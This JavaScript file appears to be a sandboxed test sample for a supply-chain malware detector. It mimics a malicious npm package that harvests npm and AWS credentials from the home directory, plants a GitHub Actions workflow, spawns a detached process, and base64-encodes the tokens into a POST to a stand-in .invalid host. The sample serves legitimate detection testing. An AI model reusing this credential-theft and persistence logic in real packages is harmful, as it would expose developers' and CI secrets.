"use strict";

/**
 * HARMLESS SIETCH DEMO WORM LOOKALIKE (@sietch-demo/currency-format-lite@1.0.2)
 *
 * Designed solely for MindSprint 2026 AIA-02 Sietch Sandbox detonation testing.
 * Safety invariants:
 *   1. Refuses to execute unless SIETCH_SANDBOX_DETONATION=1 (never touches a real dev machine).
 *   2. Targets only RFC 2606 `.invalid` domain (`telemetry.currency-format.invalid`), which
 *      cannot resolve on the public internet and is captured locally by Sietch's sink.
 *
 * Behaviors exercised to trigger @sietch/core deterministic rules:
 *   - R2 (High):     Reads ~/.npmrc and ~/.aws/credentials inside the fake CI home.
 *   - R1 (Critical): Base64-encodes the harvested npm_... honeytoken into an HTTP POST body.
 *   - R3 (High):     Sends HTTP POST to non-allowlisted host telemetry.currency-format.invalid.
 *   - R6 (Critical): Plants .github/workflows/telemetry.yml outside node_modules.
 *   - R10 (High):    Spawns a detached background child process that outlives install/load.
 */

const fs = require("node:fs");
const path = require("node:path");
const http = require("node:http");
const { spawn } = require("node:child_process");

if (process.env.SIETCH_SANDBOX_DETONATION !== "1") {
  // Safety lock: never run outside an explicit Sietch detonation sandbox.
  process.exit(0);
}

const homeDir = process.env.HOME || "/home/runner";
const workspaceDir = process.env.GITHUB_WORKSPACE || process.cwd();

function safeRead(filePath) {
  try {
    return fs.readFileSync(filePath, "utf8");
  } catch {
    return "";
  }
}

// 1. Harvest credential stores inside the fake CI home -> triggers R2 (High)
const npmrcContent = safeRead(path.join(homeDir, ".npmrc"));
const awsCredsContent = safeRead(path.join(homeDir, ".aws", "credentials"));

const npmTokenMatch = npmrcContent.match(/_authToken=([^\s]+)/);
const npmToken = npmTokenMatch ? npmTokenMatch[1] : process.env.NPM_TOKEN || "";
const awsKeyMatch = awsCredsContent.match(/aws_access_key_id\s*=\s*([^\s]+)/);
const awsAccessKey = awsKeyMatch ? awsKeyMatch[1] : "";

// 2. Plant a persistent GitHub Actions workflow outside node_modules -> triggers R6 (Critical)
try {
  const workflowsDir = path.join(workspaceDir, ".github", "workflows");
  fs.mkdirSync(workflowsDir, { recursive: true });
  const workflowFile = path.join(workflowsDir, "telemetry.yml");
  const workflowYaml = [
    "name: Currency Telemetry Sync",
    "on: [push]",
    "jobs:",
    "  sync:",
    "    runs-on: ubuntu-latest",
    "    steps:",
    "      - run: echo \"sietch-demo-persistence-marker\"",
    "",
  ].join("\n");
  fs.writeFileSync(workflowFile, workflowYaml, "utf8");
} catch {
  // Ignore if sandbox filesystem is read-only
}

// 3. Spawn a detached lingering background worker -> triggers R10 (High)
try {
  const lingerScript = "setTimeout(function () {}, 15000);";
  const child = spawn(process.execPath, ["-e", lingerScript], {
    detached: true,
    stdio: "ignore",
  });
  child.unref();
} catch {
  // Ignore spawn failures
}

// 4. Base64-encode the stolen npm honeytoken & POST to .invalid -> triggers R1 (Critical) & R3 (High)
const exfilPayload = JSON.stringify({
  pkg: "@sietch-demo/currency-format-lite@1.0.2",
  host: process.env.RUNNER_NAME || "unknown",
  npmAuthToken: npmToken,
  awsKeyId: awsAccessKey,
});
const encodedPayload = Buffer.from(exfilPayload, "utf8").toString("base64");
const requestBody = JSON.stringify({ blob: encodedPayload });

const req = http.request(
  {
    hostname: "telemetry.currency-format.invalid",
    port: 80,
    path: "/collect",
    method: "POST",
    headers: {
      Host: "telemetry.currency-format.invalid",
      "Content-Type": "application/json",
      "Content-Length": Buffer.byteLength(requestBody),
      "X-Telemetry-Client": "currency-format-lite/1.0.2",
    },
    timeout: 1500,
  },
  (res) => {
    res.resume();
    res.on("end", () => process.exit(0));
  },
);

req.on("error", () => {
  process.exit(0);
});

req.on("timeout", () => {
  req.destroy();
  process.exit(0);
});

req.write(requestBody);
req.end();
